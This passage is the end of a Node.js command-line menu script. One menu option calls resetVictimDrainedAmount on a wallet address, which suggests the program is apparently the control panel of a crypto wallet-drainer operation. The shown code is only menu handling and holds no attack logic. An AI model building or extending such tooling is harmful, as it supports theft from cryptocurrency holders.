                        await sleep(2000);
                        showMenu();
                        return;
                    }

                    await resetVictimDrainedAmount(address);
                    await sleep(5000);
                    showMenu();
                });
                break;

            case "8":
                console.log("\n👋 Exiting...");
                process.exit(0);
                break;

            default:
                console.log("\n❌ Invalid choice. Try again.");
                await sleep(2000);
                showMenu();
                break;
        }
    });
}

showMenu();